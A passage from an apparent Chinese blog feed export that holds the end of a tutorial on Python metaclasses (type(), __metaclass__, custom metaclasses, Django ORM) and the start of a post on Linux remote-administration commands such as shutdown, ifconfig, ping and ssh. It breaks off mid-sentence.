</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; MyShinyClass &#x3D; type(&#39;MyShinyClass&#39;, (), &#123;&#125;)  # 返回一个类对象</span><br><span class="line">&gt;&gt;&gt; print MyShinyClass</span><br><span class="line">&lt;class &#39;__main__.MyShinyClass&#39;&gt;</span><br><span class="line">&gt;&gt;&gt; print MyShinyClass()  #  创建一个该类的实例</span><br><span class="line">&lt;__main__.MyShinyClass object at 0x8997cec&gt;</span><br></pre></td></tr></table></figure><p>你会发现我们使用“MyShinyClass”作为<strong>类名</strong>，并且<strong>也可以把它当做一个变量来作为类的引用</strong>。类和变量是不同的，这里没有任何理由把事情弄的复杂。</p><p>type 接受一个字典来为类定义属性，因此</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; class Foo(object):</span><br><span class="line">…       bar &#x3D; True</span><br></pre></td></tr></table></figure><p>可以翻译为： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; Foo &#x3D; type(&#39;Foo&#39;, (), &#123;&#39;bar&#39;:True&#125;)</span><br></pre></td></tr></table></figure><p>并且可以将Foo当成一个普通的类一样使用： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print Foo</span><br><span class="line">&lt;class &#39;__main__.Foo&#39;&gt;</span><br><span class="line">&gt;&gt;&gt; print Foo.bar</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; f &#x3D; Foo()</span><br><span class="line">&gt;&gt;&gt; print f</span><br><span class="line">&lt;__main__.Foo object at 0x8a9b84c&gt;</span><br><span class="line">&gt;&gt;&gt; print f.bar</span><br><span class="line">True</span><br></pre></td></tr></table></figure><p>当然，你可以向这个类<strong>继承</strong>，所以，如下的代码： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; class FooChild(Foo):</span><br><span class="line">…       pass</span><br></pre></td></tr></table></figure><p>就可以写成： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; FooChild &#x3D; type(&#39;FooChild&#39;, (Foo,),&#123;&#125;)</span><br><span class="line">&gt;&gt;&gt; print FooChild</span><br><span class="line">&lt;class &#39;__main__.FooChild&#39;&gt;</span><br><span class="line">&gt;&gt;&gt; print FooChild.bar   # bar属性是由Foo继承而来</span><br><span class="line">True</span><br></pre></td></tr></table></figure><p>你可以看到，在Python中，<strong>类也是对象，你可以动态的创建类</strong>。这就是当你使用关键字<code>class</code>时Python在幕后做的事情，而这就是通过<strong>元类</strong>来<u>实现的</u>。 </p><h1 id="到底什么是元类（终于到主题了）"><a href="#到底什么是元类（终于到主题了）" class="headerlink" title="到底什么是元类（终于到主题了）"></a><strong><center>到底什么是元类（终于到主题了）</center></strong></h1><p><strong>元类</strong>就是用来<strong>创建类</strong>的“东西”。你<u>创建类就是为了创建类的实例对象</u>，不是吗？但是我们已经学习到了Python中的类也是对象。好吧，<strong>元类</strong>就是用来<strong>创建这些类（对象</strong>）的，<code>元类就是类的类</code>，你可以这样理解 为： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MyClass &#x3D; MetaClass()</span><br><span class="line">MyObject &#x3D; MyClass()</span><br></pre></td></tr></table></figure><p>你已经看到了type可以让你像这样做： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MyClass &#x3D; type(&#39;MyClass&#39;, (), &#123;&#125;)</span><br></pre></td></tr></table></figure><p>这是因为函数<code>type</code>实际上是一个<code>元类</code>。<strong>type就是Python在背后用来创建<code>所有类</code>的元类</strong>。现在你想知道那为什么type会全部采用小写形式而不是Type呢？好吧，我猜这是为了和str保持一致性，<code>str</code>是用来创建字符串对象的类，而<code>int</code>是用来创建整数对象的类。<code>type</code>就是<code>创建类对象的类</code>。你可以通过检查<code>__class__</code>属性来看到这一点。Python中所有的东西，注意，我是指<strong>所有的东西——都是对象</strong>。这包括整数、字符串、函数以及类。它们<strong>全部都是对象，而且它们都是从一个类创建而来</strong>。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; age &#x3D; 35</span><br><span class="line">&gt;&gt;&gt; age.__class__</span><br><span class="line">&lt;type &#39;int&#39;&gt;</span><br><span class="line">&gt;&gt;&gt; name &#x3D; &#39;bob&#39;</span><br><span class="line">&gt;&gt;&gt; name.__class__</span><br><span class="line">&lt;type &#39;str&#39;&gt;</span><br><span class="line">&gt;&gt;&gt; def foo(): pass</span><br><span class="line">&gt;&gt;&gt;foo.__class__</span><br><span class="line">&lt;type &#39;function&#39;&gt;</span><br><span class="line">&gt;&gt;&gt; class Bar(object): pass</span><br><span class="line">&gt;&gt;&gt; b &#x3D; Bar()</span><br><span class="line">&gt;&gt;&gt; b.__class__</span><br><span class="line">&lt;class &#39;__main__.Bar&#39;&gt;</span><br></pre></td></tr></table></figure><p>现在，对于任何一个__class__的__class__属性又是什么呢？ </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; a.__class__.__class__</span><br><span class="line">&lt;type &#39;type&#39;&gt;</span><br><span class="line">&gt;&gt;&gt; age.__class__.__class__</span><br><span class="line">&lt;type &#39;type&#39;&gt;</span><br><span class="line">&gt;&gt;&gt; foo.__class__.__class__</span><br><span class="line">&lt;type &#39;type&#39;&gt;</span><br><span class="line">&gt;&gt;&gt; b.__class__.__class__</span><br><span class="line">&lt;type &#39;type&#39;&gt;</span><br></pre></td></tr></table></figure><p>因此，<code>元类</code>就是<code>创建类这种对象</code>的东西。如果你喜欢的话，可以把元类称为“<code>类工厂</code>”（不要和工厂类搞混了:D） type就是Python的<code>内建元类</code>，当然了，你也可以创建自己的元类。 </p><p>#<center> __metaclass__属性</center></p><p>你可以在写一个类的时候为其添加<code>__metaclass__</code>属性。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Foo(object):</span><br><span class="line">    __metaclass__ &#x3D; something…</span><br><span class="line">[…]</span><br></pre></td></tr></table></figure><p>如果你这么做了，Python就会用<strong>元类来创建类Foo</strong>。小心点，这里面有些技巧。你首先写下class  Foo(object)，但是类对象Foo还没有在内存中创建。Python会在类的定义中寻找<code>metaclass</code>属性，如果<strong>找到</strong>了，Python就会<strong>用它来创建类Foo</strong>，如果<strong>没有</strong>找到，就会用<strong>内建的type来创建这个类</strong>。把下面这段话反复读几次。当你写如下代码时 : </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">class Foo(Bar):</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure><p>Python做了如下的操作：</p><p>Foo中有<code>__metaclass__</code>这个属性吗？如果<strong>是</strong>，Python会在内存中通过<strong>metaclass__创建一个名字为Foo的<strong>类对象</strong>（我说的是类对象，请紧跟我的思路）。如果Python<strong>没有</strong>找到__metaclass__，它会继续在Bar（<strong>父类</strong>）中寻找<code>__metaclass__</code>属性，并尝试做和前面同样的操作。如果Python在任何父类中都找不到__metaclass__，它就会在<code>模块层次</code>中去寻找<code>__metaclass__</code>，并尝试做同样的操作。如果还是<strong>找不到</strong>__metaclass</strong>,Python就会用内置的<code>type</code>来<strong>创建这个类对象</strong>。</p><p>现在的问题就是，你可以在__metaclass__中放置些什么代码呢？答案就是：可以<code>创建一个类的东西</code>。那么什么可以用来创建一个类呢？<code>type</code>，或者<code>任何使用到type或者子类化type的东东</code>都可以。</p><h1 id="自定义元类"><a href="#自定义元类" class="headerlink" title="自定义元类"></a><center>自定义元类</center></h1><p>元类的<strong>主要目的</strong>就是为了当创建类时能够<code>自动地改变类</code>。通常，你会为API做这样的事情，你希望可以创建符合当前上下文的类。假想一个很傻的例子，你决定在你的模块里所有的类的属性都应该是大写形式。有好几种方法可以办到，但其中一种就是通过<code>在模块级别</code>设定<code>__metaclass__</code>。采用这种方法，这个模块中的所有类都会通过这个元类来创建，我们只需要告诉元类把所有的属性都改成大写形式就万事大吉了。</p><p>幸运的是，<code>__metaclass__</code>实际上<strong>可以被任意调用</strong>，它并不需要是一个正式的类（我知道，某些名字里带有‘class’的东西并不需要是一个class，画画图理解下，这很有帮助）。所以，我们这里就先以一个简单的函数作为例子开始。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 元类会自动将你通常传给‘type’的参数作为自己的参数传入</span><br><span class="line">def upper_attr(future_class_name, future_class_parents, future_class_attr):</span><br><span class="line">    &#39;&#39;&#39;返回一个类对象，将属性都转为大写形式&#39;&#39;&#39;</span><br><span class="line">    #  选择所有不以&#39;__&#39;开头的属性</span><br><span class="line">    attrs &#x3D; ((name, value) for name, value in future_class_attr.items() if not name.startswith(&#39;__&#39;))</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">    # 将它们转为大写形式</span><br><span class="line">    uppercase_attr &#x3D; dict((name.upper(), value) for name, value in attrs)</span><br><span class="line"></span><br><span class="line">    # 通过&#39;type&#39;来做类对象的创建</span><br><span class="line">    return type(future_class_name, future_class_parents, uppercase_attr)</span><br><span class="line"></span><br><span class="line">__metaclass__ &#x3D; upper_attr  #  这会作用到这个模块中的所有类</span><br><span class="line"></span><br><span class="line">class Foo(object):</span><br><span class="line">    # 我们也可以只在这里定义__metaclass__，这样就只会作用于这个类中</span><br><span class="line">    bar &#x3D; &#39;bip&#39;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">print hasattr(Foo, &#39;bar&#39;)</span><br><span class="line"># 输出: False</span><br><span class="line">print hasattr(Foo, &#39;BAR&#39;)</span><br><span class="line"># 输出:True</span><br><span class="line"></span><br><span class="line">f &#x3D; Foo()</span><br><span class="line">print f.BAR</span><br><span class="line"># 输出:&#39;bip&#39;</span><br></pre></td></tr></table></figure><p>现在让我们再做一次，这一次用一个真正的class来当做元类。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 请记住，&#39;type&#39;实际上是一个类，就像&#39;str&#39;和&#39;int&#39;一样</span><br><span class="line"># 所以，你可以从type继承</span><br><span class="line">class UpperAttrMetaClass(type):</span><br><span class="line">    # __new__ 是在__init__之前被调用的特殊方法</span><br><span class="line">    # __new__是用来创建对象并返回之的方法</span><br><span class="line">    # 而__init__只是用来将传入的参数初始化给对象</span><br><span class="line">    # 你很少用到__new__，除非你希望能够控制对象的创建</span><br><span class="line">    # 这里，创建的对象是类，我们希望能够自定义它，所以我们这里改写__new__</span><br><span class="line">    # 如果你希望的话，你也可以在__init__中做些事情</span><br><span class="line">    # 还有一些高级的用法会涉及到改写__call__特殊方法，但是我们这里不用</span><br><span class="line">    def __new__(upperattr_metaclass, future_class_name, future_class_parents, future_class_attr):</span><br><span class="line">        attrs &#x3D; ((name, value) for name, value in future_class_attr.items() if not name.startswith(&#39;__&#39;))</span><br><span class="line">        uppercase_attr &#x3D; dict((name.upper(), value) for name, value in attrs)</span><br><span class="line">        return type(future_class_name, future_class_parents, uppercase_attr)</span><br></pre></td></tr></table></figure><p>但是，这种方式其实不是OOP。我们直接调用了type，而且我们没有改写父类的__new__方法。现在让我们这样去处理: </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">class UpperAttrMetaclass(type):</span><br><span class="line">    def __new__(upperattr_metaclass, future_class_name, future_class_parents, future_class_attr):</span><br><span class="line">        attrs &#x3D; ((name, value) for name, value in future_class_attr.items() if not name.startswith(&#39;__&#39;))</span><br><span class="line">        uppercase_attr &#x3D; dict((name.upper(), value) for name, value in attrs)</span><br><span class="line"></span><br><span class="line">        # 复用type.__new__方法</span><br><span class="line">        # 这就是基本的OOP编程，没什么魔法</span><br><span class="line">        return type.__new__(upperattr_metaclass, future_class_name, future_class_parents, uppercase_attr)</span><br></pre></td></tr></table></figure><p>你可能已经注意到了有个额外的参数<code>upperattr_metaclass</code>，这并没有什么特别的。类方法的<strong>第一个参数</strong>总是表示<strong>当前的实例</strong>，就像在普通的类方法中的<code>self</code>参数一样。当然了，为了清晰起见，这里的名字我起的比较长。但是就像self一样，所有的参数都有它们的传统名称。因此，在真实的产品代码中一个元类应该是像这样的： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">class UpperAttrMetaclass(type):</span><br><span class="line">    def __new__(cls, name, bases, dct):</span><br><span class="line">        attrs &#x3D; ((name, value) for name, value in dct.items() if not name.startswith(&#39;__&#39;)</span><br><span class="line">        uppercase_attr  &#x3D; dict((name.upper(), value) for name, value in attrs)</span><br><span class="line">        return type.__new__(cls, name, bases, uppercase_attr)</span><br></pre></td></tr></table></figure><p>如果使用<code>super</code>方法的话，我们还可以使它变得更清晰一些，这会缓解继承（是的，你可以拥有元类，从元类继承，从type继承） </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">class UpperAttrMetaclass(type):</span><br><span class="line">    def __new__(cls, name, bases, dct):</span><br><span class="line">        attrs &#x3D; ((name, value) for name, value in dct.items() if not name.startswith(&#39;__&#39;))</span><br><span class="line">        uppercase_attr &#x3D; dict((name.upper(), value) for name, value in attrs)</span><br><span class="line">        return super(UpperAttrMetaclass, cls).__new__(cls, name, bases, uppercase_attr)</span><br></pre></td></tr></table></figure><p>就是这样，除此之外，关于元类真的没有别的可说的了。使用到元类的代码比较复杂，这背后的原因倒并不是因为元类本身，而是因为你通常会使用元类去做一些晦涩的事情，依赖于<strong>自省，控制继承</strong>等等。确实，用元类来搞些“黑暗魔法”是特别有用的，因而会搞出些复杂的东西来。但就元类本身而言，它们其实是很简单的：</p><blockquote><p><strong>1)</strong>   拦截类的创建</p><p><strong>2)</strong>   修改类</p><p><strong>3)</strong>   返回修改之后的类</p></blockquote><h1 id="为什么要用metaclass类而不是函数"><a href="#为什么要用metaclass类而不是函数" class="headerlink" title="为什么要用metaclass类而不是函数?"></a><center>为什么要用metaclass类而不是函数?</center></h1><p>由于__metaclass__可以接受<code>任何</code>可调用的对象，那为何还要使用类呢，因为很显然使用类会更加复杂啊？这里有好几个原因：</p><blockquote><p>1）  意图会更加清晰。当你读到UpperAttrMetaclass(type)时，你知道接下来要发生什么。</p><p>2） 你可以使用OOP编程。元类可以从元类中继承而来，改写父类的方法。元类甚至还可以使用元类。</p><p>3）  你可以把代码组织的更好。当你使用元类的时候肯定不会是像我上面举的这种简单场景，通常都是针对比较复杂的问题。将多个方法归总到一个类中会很有帮助，也会使得代码更容易阅读。</p><p>4） 你可以使用<strong>new</strong>, __init__以及__call__这样的特殊方法。它们能帮你处理不同的任务。就算通常你可以把所有的东西都在__new__里处理掉，有些人还是觉得用__init__更舒服些。</p><p>5） 哇哦，这东西的名字是metaclass，肯定非善类，我要小心！</p></blockquote><h1 id="究竟为什么要使用元类？"><a href="#究竟为什么要使用元类？" class="headerlink" title="究竟为什么要使用元类？"></a><center>究竟为什么要使用元类？</center></h1><p>现在回到我们的大主题上来，究竟是为什么你会去使用这样一种容易出错且晦涩的特性？好吧，一般来说，你根本就用不上它：</p><blockquote><p>“元类就是深度的魔法，99%的用户应该根本不必为此操心。如果你想搞清楚究竟是否需要用到元类，那么你就不需要它。那些实际用到元类的人都非常清楚地知道他们需要做什么，而且根本不需要解释为什么要用元类。”  —— Python界的领袖 Tim Peters</p></blockquote><p><code>元类</code>的<strong>主要用途</strong>是<code>创建API</code>。一个典型的例子是<code>Django ORM</code>。它允许你像这样定义：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Person(models.Model):</span><br><span class="line">    name &#x3D; models.CharField(max_length&#x3D;30)</span><br><span class="line">    age &#x3D; models.IntegerField()</span><br></pre></td></tr></table></figure><p>但是如果你像这样做的话： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">guy  &#x3D; Person(name&#x3D;&#39;bob&#39;, age&#x3D;&#39;35&#39;)</span><br><span class="line">print guy.age</span><br></pre></td></tr></table></figure><p>这并不会返回一个IntegerField对象，而是会返回一个int，甚至可以直接从数据库中取出数据。这是有可能的，因为<code>models.Model</code>定义了<code>__metaclass__</code>， 并且使用了一些魔法能够将你刚刚定义的简单的Person类转变成对数据库的一个复杂<code>hook</code>。Django框架将这些看起来很复杂的东西通过暴露出一个简单的使用元类的API将其化简，通过这个API重新创建代码，在背后完成真正的工作。 </p><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a><center>结语</center></h1><p>首先，你知道了<strong>类其实是能够创建出类实例的对象</strong>。好吧，事实上，<strong>类本身也是实例</strong>，当然，它们<strong>是元类的实例。</strong> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;class Foo(object): pass</span><br><span class="line">&gt;&gt;&gt; id(Foo)</span><br><span class="line">142630324</span><br></pre></td></tr></table></figure><p>Python中的<code>一切都是对象</code>，它们要么是<code>类的实例</code>，要么是<code>元类的实例</code>，除了type。<code>type实际上是它自己的元类</code>，在纯Python环境中这可不是你能够做到的，这是通过在实现层面耍一些小手段做到的。其次，元类是很复杂的。对于非常简单的类，你可能不希望通过使用元类来对类做修改。你可以通过其他两种技术来修改类：</p><p>1） <a href="http://en.wikipedia.org/wiki/Monkey_patch">Monkey patching</a></p><ol start="2"><li>class decorators</li></ol><p>当你需要动态修改类时，99%的时间里你最好使用上面这两种技术。当然了，其实在99%的时间里你根本就不需要动态修改类 :D</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 元类 </tag>
            
            <tag> metaclass </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux远程管理常用命令</title>
      <link href="/2018/05/10/Linux%E8%BF%9C%E7%A8%8B%E7%AE%A1%E7%90%86%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
      <url>/2018/05/10/Linux%E8%BF%9C%E7%A8%8B%E7%AE%A1%E7%90%86%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="远程管理常用命令"><a href="#远程管理常用命令" class="headerlink" title="远程管理常用命令"></a>远程管理常用命令</h1><h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><a id="more"></a><ul><li>关机/重启<ul><li><code>shutdown</code></li></ul></li><li>查看或配置网卡信息<ul><li><code>ifconfig</code></li><li><code>ping</code></li></ul></li><li>远程登录和复制文件<ul><li><code>ssh</code></li><li><code>scp</code></li></ul></li></ul><h2 id="01-关机-重启"><a href="#01-关机-重启" class="headerlink" title="01. 关机/重启"></a>01. 关机/重启</h2><table><thead><tr><th>序号</th><th>命令</th><th>对应英文</th><th>作用</th></tr></thead><tbody><tr><td>01</td><td>shutdown 选项 时间</td><td>shutdown</td><td>关机／重新启动</td></tr></tbody></table><h3 id="1-1-shutdown"><a href="#1-1-shutdown" class="headerlink" title="1.1 shutdown"></a>1.1 <code>shutdown</code></h3><ul><li><code>shutdown</code> 命令可以 <strong>安全</strong> <strong>关闭</strong> 或者 <strong>重新启动系统</strong></li></ul><table><thead><tr><th>选项</th><th>含义</th></tr></thead><tbody><tr><td>-r</td><td>重新启动</td></tr></tbody></table><blockquote><p>提示：</p><ul><li><strong>不指定选项和参数</strong>，默认表示 <strong>1 分钟</strong>之后 <strong>关闭电脑</strong></li><li>远程维护服务器时，最好不要关闭系统，而应该重新启动系统</li></ul></blockquote><ul><li>常用命令示例</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 重新启动操作系统，其中 now 表示现在</span></span><br><span class="line">$ shutdown -r now</span><br><span class="line"></span><br><span class="line"><span class="comment"># 立刻关机，其中 now 表示现在</span></span><br><span class="line">$ shutdown now</span><br><span class="line"></span><br><span class="line"><span class="comment"># 系统在今天的 20:25 会关机</span></span><br><span class="line">$ shutdown 20:25</span><br><span class="line"></span><br><span class="line"><span class="comment"># 系统再过十分钟后自动关机</span></span><br><span class="line">$ shutdown +10</span><br><span class="line"></span><br><span class="line"><span class="comment"># 取消之前指定的关机计划</span></span><br><span class="line">$ shutdown -c</span><br></pre></td></tr></table></figure><h2 id="02-查看或配置网卡信息"><a href="#02-查看或配置网卡信息" class="headerlink" title="02. 查看或配置网卡信息"></a>02. 查看或配置网卡信息</h2><table><thead><tr><th>序号</th><th>命令</th><th>对应英文</th><th>作用</th></tr></thead><tbody><tr><td>01</td><td>ifconfig</td><td>configure a network interface</td><td>查看/配置计算机当前的网卡配置信息</td></tr><tr><td>02</td><td>ping ip地址</td><td>ping</td><td>检测到目标 ip地址 的连接是否正常</td></tr></tbody></table><h3 id="2-1-网卡-和-IP-地址"><a href="#2-1-网卡-和-IP-地址" class="headerlink" title="2.1 网卡 和 IP 地址"></a>2.1 网卡 和 IP 地址</h3><h4 id="网卡"><a href="#网卡" class="headerlink" title="网卡"></a>网卡</h4><ul><li>网卡是一个专门负责网络通讯的硬件设备</li><li><strong>IP 地址</strong>是设置在网卡上的地址信息</li></ul><blockquote><p>我们可以把 <strong>电脑</strong> 比作 <strong>电话</strong>，<strong>网卡</strong> 相当于 <strong>SIM 卡</strong>，<strong>IP 地址</strong> 相当于 <strong>电话号码</strong></p></blockquote><h4 id="IP-地址"><a href="#IP-地址" class="headerlink" title="IP 地址"></a>IP 地址</h4><ul><li><strong>每台联网的电脑上</strong>都有 <strong>IP 地址</strong>，<strong>是保证电脑之间正常通讯的重要设置</strong></li></ul><blockquote><p>注意：每台电脑的 IP 地址不能相同，否则会出现 IP 地址冲突，并且没有办法正常通讯</p><p>提示：有关 <strong>IP 地址</strong>的详细内容，在就业班会详细讲解！</p></blockquote><h3 id="2-2-ifconfig"><a href="#2-2-ifconfig" class="headerlink" title="2.2 ifconfig"></a>2.2 <code>ifconfig</code></h3><ul><li><code>ifconfig</code> 可以查看／配置计算机当前的网卡配置信息</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看网卡配置信息</span></span><br><span class="line">$ ifconfig</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看网卡对应的 IP 地址</span></span><br><span class="line">$ ifconfig | grep inet</span><br></pre></td></tr></table></figure><blockquote><p>提示：一台计算机中有可能会有一个 <strong>物理网卡</strong> 和 <strong>多个虚拟网卡</strong>，在 Linux 中物理网卡的名字通常以 <code>ensXX</code> 表示</p></blockquote><ul><li><code>127.0.0.1</code> 被称为 <strong>本地回环/环回地址</strong>，一般用来测试本机网卡是否正常</li></ul><h3 id="2-3-ping"><a href="#2-3-ping" class="headerlink" title="2.3 ping"></a>2.3 <code>ping</code></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 检测到目标主机是否连接正常</span></span><br><span class="line">$ ping IP地址</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检测本地网卡工作正常</span></span><br><span class="line">$ ping 127.0.0.1</span><br></pre></td></tr></table></figure><ul><li><code>ping</code> 一般用于检测当前计算机到目标计算机之间的网络 <strong>是否通畅</strong>，<strong>数值越大，速度越慢</strong></li></ul><blockquote><ul><li><code>ping</code> 的工作原理与潜水艇的声纳相似，<code>ping</code> 这个命令就是取自 <strong>声纳的声音</strong> </li><li>网络管理员之间也常将 <code>ping</code> 用作动词 —— <strong>ping 一下计算机X，看他是否开着</strong></li></ul></blockquote><p>原理：网络上的机器都有 <strong>唯一确定的 IP 地址</strong>，我们给<strong>目标 IP 地址</strong>发送一个数据包，对方就要返回一个数据包，根据返回的数据包以及时间，我们可以确定目标主机的存在</p><blockquote><p>提示：在 Linux 中，想要终止一个终端程序的执行，绝大多数都可以使用 <code>CTRL + C</code></p></blockquote><h2 id="03-远程登录和复制文件"><a href="#03-远程登录和复制文件" class="headerlink" title="03. 远程登录和复制文件"></a>03. 远程登录和复制文件</h2><table><thead><tr><th>序号</th><th>命令</th><th>对应英文</th><th>作用</th></tr></thead><tbody><tr><td>01</td><td>ssh 用户名@ip</td><td>secure shell</td><td>关机／重新启动</td></tr><tr><td>02</td><td>scp 用户名@ip:文件名或路径 用户名@ip:文件名或路径</td><td>secure copy</td><td>远程复制文件</td></tr></tbody></table><h3 id="3-1-ssh-基础（重点）"><a href="#3-1-ssh-基础（重点）" class="headerlink" title="3.1 ssh 基础（重点）"></a>3.1 <code>ssh</code> 基础（重点）</h3><p>在 Linux 中 SSH 是 <strong>非常常用</strong> 的工具，通过 <strong>SSH 客户端</strong> 我们可以连接到运行了 <strong>SSH 服务器</strong> 的远程机器上</p><center><p><img src="/2018/05/10/Linux%E8%BF%9C%E7%A8%8B%E7%AE%A1%E7%90%86%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/001_SSH%E7%A4%BA%E6%84%8F%E5%9B%BE.png"></p></center><ul><li><strong>SSH 客户端</strong>是一种使用 <code>Secure Shell（SSH）</code> 协议连接到远程计算机的软件程序</li><li><code>SSH</code> 是目前较可靠，<strong>专为远程登录会话和其他网络服务</strong> 提供安全性的协议<ul><li>利用 <code>SSH 协议</code> 可以有效<strong>防止远程管理过程中的信息泄露</strong></li><li>通过 <code>SSH 协议</code> 可以对所有传输的数据进行加密，也能够防止 DNS 欺骗和 IP 欺骗</li></ul></li><li><code>SSH</code> 的另一项优点是传输的数据可以是经过压缩的，所以可以加快传输的速度</li></ul><h4 id="1-域名-和-端口号"><a href="#1-域名-和-端口号" class="headerlink" title="1) 域名 和 端口号"></a>1) 域名 和 端口号</h4><h5 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h5><ul><li>由一串 <strong>用点分隔</strong> 的名字组成，例如：<code>www.itcast.cn</code></li><li>是 <strong>IP 地址</strong> 的别名，方便用户记忆</li></ul><h5 id="端口号"><a href="#端口号" class="headerlink" title="端口号"></a>端口号</h5><ul><li><strong>IP 地址</strong>：通过 <strong>IP 地址</strong> 找到网络上的 <strong>计算机</strong></li><li><strong>端口号</strong>：通过 <strong>端口号</strong> 可以找到 <strong>计算机上运行的应用程序</strong><ul><li><strong>SSH 服务器</strong> 的默认端口号是 